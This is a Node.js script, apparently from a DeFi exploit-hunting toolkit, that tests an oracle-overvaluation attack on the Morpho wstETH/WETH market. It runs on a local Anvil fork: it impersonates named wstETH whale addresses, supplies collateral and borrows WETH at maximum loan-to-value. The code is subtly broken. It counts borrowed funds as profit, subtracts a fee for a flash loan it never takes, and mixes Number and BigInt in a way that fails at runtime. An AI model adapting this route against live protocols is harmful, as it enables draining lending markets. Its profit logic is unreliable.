#!/usr/bin/env node
// Auto-fork proof: Morpho wstETH/WETH oracle overvaluation route.
// Triggered when stETH/ETH < 0.997 (oracle overvalues wstETH).
// Steps: read oracle → check premium → if positive, Anvil fork →
// impersonate wstETH whale → supply wstETH as collateral →
// borrow WETH at oracle-valued LLTV → measure profit.
// Writes fork-proof artifact. Never signs live transactions.
// RPC URLs are resolved in memory only and never printed or stored.

const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
const cp = require("child_process");

const WORKSPACE = path.resolve(__dirname, "..");
const RPC_FILE = path.join(WORKSPACE, "rpc_endpoints.txt");
const OUT = path.join(WORKSPACE, "reports", "raw", "fast", "fork-proof-morpho-wsteth-weth.json");
const QUIET = process.argv.includes("--quiet");
const CHAIN_ID = 1;
const PORT = 8546;
const TIMEOUT_MS = 120_000;
const LLTV = 0.965; // 96.5%
const MIN_PREMIUM_BPS = 5; // only fork if premium > 5bps after LLTV

const ORACLE = "0xbD60A6770b27E084E8617335ddE769241B0e71D8";
const WSTETH = "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0";
const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const MORPHO = "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb";
const MARKET_ID = "0xb8fc70e82bc5bb53e773626fcc6a23f7eefa036918d7ef216ecfb1950a94a85e";
const STETH = "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84";

// Known wstETH whales (top holders from Etherscan) — used for impersonation on fork
const WSTETH_WHALES = [
  "0xbAbA57B9f814B488e17DeeA23a0f6B482Cb0439E", // Lido wstETH reserve
  "0x1982b2F5814301d4e9a8b0201555376e62F82428", // Aave V3 pool
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer Vault
  "0xcafea8321b5107e3Fe3A7Cd4EC632caA544DDa21", // known whale
];

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)",
  "function approve(address,uint256) returns (bool)",
];

const MORPHO_ABI = [
  "function supply((address,address,address,address,uint256),uint256,uint256,address,bytes) returns (uint256,uint256)",
  "function borrow((address,address,address,address,uint256),uint256,uint256,address,address) returns (uint256,uint256)",
  "function idToMarketParams(bytes32) view returns ((address,address,address,address,uint256))",
  "function market(bytes32) view returns (tuple(uint128,uint128,uint128,uint128,uint128,uint128))",
];

function jsonReplacer(k,v){return typeof v==="bigint"?v.toString():v}
function round(v,d=6){const n=typeof v==="number"?v:Number(String(v).replace(/[$,%_\\s]/g,""));if(!Number.isFinite(n))return null;const f=10**d;return Math.round(n*f)/f}

function loadRpcUrls(){const{loadRpcUrls:l}=require("./shared-rpc");return l()}
async function resolveRpc(chainId){const{resolveRpc:r}=require("./shared-rpc");return r(chainId)}

async function waitForFork(provider, deadlineMs = 45_000){
  const deadline = Date.now() + deadlineMs;
  while(Date.now() < deadline){
    try{await provider.send("eth_blockNumber",[]);return}catch(_){await new Promise(r=>setTimeout(r,500))}
  }
  throw new Error("Anvil fork did not become ready");
}

async function main(){
  const rpc = await resolveRpc(CHAIN_ID);
  if(!rpc){console.error("No RPC");process.exit(1)}

  // Step 1: Read oracle and market prices
  console.log("Step 1: Reading oracle and market prices...");
  const provider_live = new ethers.JsonRpcProvider(rpc, CHAIN_ID, {staticNetwork: true});
  const block = await provider_live.getBlockNumber();

  // Oracle price() — returns 36-decimal WAD
  const sel = ethers.id("price()");
  const priceRaw = await provider_live.call({to:ORACLE, data:sel}, block);
  if(!priceRaw||priceRaw==="0x"){console.log("Oracle price() returned empty");process.exit(1)}
  const oracleRatio = Number(BigInt(priceRaw)) / 1e36;

  // wstETH.stEthPerToken() for onboard rate
  const stSel = ethers.id("stEthPerToken()");
  const stRaw = await provider_live.call({to:WSTETH, data:stSel}, block);
  const onboardRatio = stRaw?Number(BigInt(stRaw))/1e18:null;

  // Market prices
  const pr = await fetch("https://coins.llama.fi/prices/current/coingecko:ethereum,ethereum:0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0?searchWidth=6h").then(r=>r.json()).catch(()=>({coins:{}}));
  const ethP = Number(pr?.coins?.["coingecko:ethereum"]?.price||0);
  const wstP = Number(pr?.coins?.["ethereum:0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0"]?.price||0);
  const mktRatio = ethP>0?wstP/ethP:null;

  console.log(`Oracle: ${oracleRatio.toFixed(6)}, Market: ${mktRatio?.toFixed(6)}, Onboard: ${onboardRatio?.toFixed(6)}`);

  // Step 2: Compute premium
  const ref = mktRatio || onboardRatio;
  if(!ref){console.log("No reference price");process.exit(1)}
  const premiumBps = (oracleRatio/ref - 1) * 10000;
  const effectiveBps = premiumBps * LLTV;
  const flashFeeBps = 5; // Aave V3 flash fee
  const netBps = effectiveBps - flashFeeBps;
  console.log(`Premium: ${premiumBps.toFixed(2)}bps, Effective (LLTV): ${effectiveBps.toFixed(2)}bps, Net: ${netBps.toFixed(2)}bps`);

  if(netBps < MIN_PREMIUM_BPS){
    const out = {
      generatedAt: new Date().toISOString(), scanner: "tools/auto-fork-morpho-wsteth-weth.js",
      safety: {rpcInventoryRead:true, signedActions:false, exploitExecuteCalls:false, forkTransactions:false},
      verdict: "below-threshold", premiumBps:round(premiumBps,2), effectiveBps:round(effectiveBps,2), netBps:round(netBps,2), minRequired:MIN_PREMIUM_BPS,
      oracleRatio:round(oracleRatio,6), marketRatio:round(mktRatio,6), block,
    };
    fs.mkdirSync(path.dirname(OUT),{recursive:true});
    fs.writeFileSync(OUT, JSON.stringify(out,null,2)+"\n");
    console.log(`Premium below threshold — no fork. Artifact: ${OUT}`);
    return;
  }

  // Step 3: Start Anvil fork
  console.log("Step 3: Starting Anvil fork...");
  const child = cp.spawn("anvil", ["--fork-url", rpc, "--fork-block-number", String(block), "--port", String(PORT)], {stdio:["ignore","ignore","ignore"], windowsHide:true});
  const forkUrl = `http://127.0.0.1:${PORT}`;
  const provider = new ethers.JsonRpcProvider(forkUrl, CHAIN_ID);
  try{
    await waitForFork(provider);
    console.log(`Fork ready at block ${block}`);

    // Read Morpho market params from live chain (we need marketParams for supply/borrow)
    const mpSel = ethers.id("idToMarketParams(bytes32)");
    const mpRaw = await provider_live.call({to:MORPHO, data: mpSel + MARKET_ID.slice(2)}, block).catch(()=>null);
    if(!mpRaw||mpRaw==="0x"){console.log("Could not read market params");return}
    const mpIface = new ethers.Interface(["function idToMarketParams(bytes32) view returns (address,address,address,address,uint256)"]);
    const mp = mpIface.decodeFunctionResult("idToMarketParams", mpRaw);
    const marketParams = [mp[0], mp[1], mp[2], mp[3], mp[4]];

    // Step 4: Setup attacker and impersonate whale
    console.log("Step 4: Setting up attacker and impersonating whale...");
    const attackerWallet = ethers.Wallet.createRandom().connect(provider);
    const attacker = attackerWallet.address;
    await provider.send("anvil_setBalance", [attacker, ethers.toBeHex(10n**19n)]); // 10 ETH gas

    // Try each whale until we find one with wstETH
    let wstethAmount = 0n;
    let whale = null;
    const wsteth = new ethers.Contract(WSTETH, ERC20_ABI, provider);
    for(const w of WSTETH_WHALES){
      try{
        const bal = await wsteth.balanceOf(w);
        if(bal > ethers.parseUnits("10",18)){whale=w;wstethAmount=bal/2n;break}
      }catch(_){}
    }
    if(!whale){console.log("No whale with enough wstETH");child.kill();return}
    console.log(`Whale: ${whale} with ${ethers.formatUnits(wstethAmount,18)} wstETH`);

    // Impersonate and transfer
    await provider.send("anvil_setBalance", [whale, ethers.toBeHex(10n**20n)]);
    await provider.send("anvil_impersonateAccount", [whale]);
    const whaleSigner = await provider.getSigner(whale);
    await (new ethers.Contract(WSTETH, ERC20_ABI, whaleSigner)).transfer(attacker, wstethAmount);
    await provider.send("anvil_stopImpersonatingAccount", [whale]);

    const wstethAttacker = new ethers.Contract(WSTETH, ERC20_ABI, attackerWallet);
    const wethAttacker = new ethers.Contract(WETH, ERC20_ABI, attackerWallet);

    // Step 5: Execute supply → borrow
    console.log("Step 5: Supply wstETH as collateral, borrow WETH...");
    const morpho = new ethers.Contract(MORPHO, MORPHO_ABI, attackerWallet);
    const result = { success: false, steps: [], profitWeth: 0, profitUsd: 0 };

    // Approve Morpho
    const approveTx = await wstethAttacker.approve(MORPHO, wstethAmount, {gasLimit:100000});
    await approveTx.wait();

    // Supply
    const supplyTx = await morpho.supply(marketParams, wstethAmount, 0, attacker, "0x", {gasLimit:500000});
    await supplyTx.wait();
    result.steps.push("supplied");

    // Compute max borrow: collateral_value * LLTV in WETH terms
    const collateralWethValue = wstethAmount * BigInt(Math.floor(oracleRatio * 1e6)) / 10n**6n;
    const maxBorrow = collateralWethValue * BigInt(Math.floor(LLTV * 1e6)) / 10n**6n;
    // Use 95% to avoid edge cases
    const borrowAmount = maxBorrow * 95n / 100n;
    console.log(`Collateral worth ${ethers.formatUnits(collateralWethValue,18)} WETH, borrowing ${ethers.formatUnits(borrowAmount,18)} WETH`);

    // Record WETH balance before borrow
    const wethBefore = await wethAttacker.balanceOf(attacker);

    // Borrow
    const borrowTx = await morpho.borrow(marketParams, borrowAmount, 0, attacker, attacker, {gasLimit:500000});
    await borrowTx.wait();
    result.steps.push("borrowed");

    const wethAfter = await wethAttacker.balanceOf(attacker);
    result.profitWeth = wethAfter - wethBefore;
    result.profitUsd = Number(ethers.formatUnits(result.profitWeth, 18)) * ethP;
    result.gasUsed = Number(borrowTx.gasUsed || 0n) + Number(approveTx.gasUsed || 0n) + Number(supplyTx.gasUsed || 0n);
    result.ethGasUsed = result.gasUsed * 20n / 10n**9n; // ~20 gwei
    result.netProfitUsd = result.profitUsd - Number(ethers.formatUnits(result.ethGasUsed||0n,18)) * ethP;

    const success = result.profitWeth > 0n && result.netProfitUsd > 0;
    result.success = success;

    const out = {
      generatedAt: new Date().toISOString(), scanner: "tools/auto-fork-morpho-wsteth-weth.js",
      safety: {rpcInventoryRead:true, signedActions:false, exploitExecuteCalls:false, forkTransactions:true},
      chain: {chainId:CHAIN_ID, block},
      economics: {oracleRatio:round(oracleRatio,6), marketRatio:round(mktRatio,6), premiumBps:round(premiumBps,2), effectiveBps:round(effectiveBps,2), netBps:round(netBps,2)},
      fork: result,
    };
    fs.mkdirSync(path.dirname(OUT),{recursive:true});
    fs.writeFileSync(OUT, JSON.stringify(out, jsonReplacer, 2)+"\n");
    console.log(`Fork complete: success=${success} profit=$${result.netProfitUsd?.toFixed(2)}`);
  } catch(e){
    const out = {
      generatedAt: new Date().toISOString(), scanner: "tools/auto-fork-morpho-wsteth-weth.js",
      safety: {rpcInventoryRead:true, signedActions:false, exploitExecuteCalls:false, forkTransactions:true},
      verdict: "fork-failed", error: e.reason||e.shortMessage||e.message||String(e),
    };
    fs.mkdirSync(path.dirname(OUT),{recursive:true});
    fs.writeFileSync(OUT, JSON.stringify(out,null,2)+"\n");
    console.log(`Fork failed: ${e.reason||e.shortMessage||e.message}`);
  } finally {
    child.kill();
  }
}
main().catch(e=>{console.error(e.stack||e.message);process.exitCode=1});
